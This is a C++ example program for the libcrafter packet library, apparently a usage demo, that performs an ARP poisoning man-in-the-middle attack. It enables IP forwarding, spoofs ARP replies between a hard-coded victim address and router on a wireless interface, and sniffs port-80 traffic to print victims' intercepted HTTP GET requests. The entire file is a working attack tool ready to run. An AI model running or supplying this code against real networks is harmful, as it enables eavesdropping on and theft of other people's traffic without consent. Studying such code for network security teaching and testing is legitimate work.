/*
 * Spawn ARP Poison
 *
 * This program illustrate the usage of the ARSpoofing function provided by
 * the library. Is quite simple and very useful when we have to combine another
 * technique with an ARP spoof attack.
 */
#include <iostream>
#include <string>
#include <crafter.h>

/* Collapse namespaces */
using namespace std;
using namespace Crafter;

/* Function for handling a packet */
void PacketHandler(Packet* sniff_packet, void* user) {
	/* sniff_packet -> pointer to the packet captured */
	/* user -> void pointer to the data supplied by the user */

	/* Check if there is a payload */
	RawLayer* raw_payload = sniff_packet->GetLayer<RawLayer>();
	if(raw_payload) {

		/* You can get the payload as a string */
		string payload = raw_payload->GetStringPayload();

		/* Print the payload only if the <GET> world is inside */
		if(payload.find("GET") != string::npos) {
			/* Print relevant data from the connection */
			TCP* tcp_layer = sniff_packet->GetLayer<TCP>();
			IP* ip_layer = sniff_packet->GetLayer<IP>();

			cout << ip_layer->GetSourceIP()      << ":" << tcp_layer->GetSrcPort() << " -> " <<
					ip_layer->GetDestinationIP() << ":" << tcp_layer->GetDstPort()
				  << endl << endl;

            /* Print the HTTP request */
			cout << payload << endl;

			cout << "[+] ------- [+]" << endl;
		}

	}
}

/* Global reference of the ARPContext */
ARPContext* global_context;

/* Global reference of the sniffer */
Sniffer* global_sniff;

/* Handling a CTRL-C */
void ctrl_c(int dummy) {
	/* Cancel the sniffer */
	global_sniff->Cancel();
	/* And shutdown the ARP poisoner */
	CleanARPContext(global_context);
}

/* Activate the IP forwarding */
void set_ipforward() {
	system("/bin/echo 1 > /proc/sys/net/ipv4/ip_forward");
}

/* Reset the IP forward */
void reset_ipforward() {
	system("/bin/echo 0 > /proc/sys/net/ipv4/ip_forward");
}

int main() {

	/* Set the interface */
	string iface = "wlan0";

	/* Host A IP address */
	string victim_net = "192.168.0.106";
	/* HOst B IP address */
	string router = "192.168.0.1";

	/* ----------------------------------------------------------------------- */

	/* Set IP forward */
	set_ipforward();

	/*
	 * Begin the ARP poisoning (Sending false ARP requests)
	 */
	global_context = ARPSpoofingReply(router,victim_net,iface);
	/*
	 * The function returns immediately, it spawns a thread "on the background"
	 * that does the ARP poisoning
	 */

	/* You can print the information of the context */
	PrintARPContext(*global_context);

	/* ----------------------------------------------------------------------- */

	/* Create a sniffer */
	Sniffer sniff("ip and tcp and port 80",iface,PacketHandler);

	/* Set the global reference */
	global_sniff = &sniff;

	/* Set the signal handler */
	signal(SIGINT,ctrl_c);

	/* And capture ad-infinitum (until CTRL-C is pressed) */
	sniff.Capture(-1);

	/* ----------------------------------------------------------------------- */

	/* Reset IP forward */
	reset_ipforward();

	cout << "[@] Main done. " << endl;

	return 0;
}
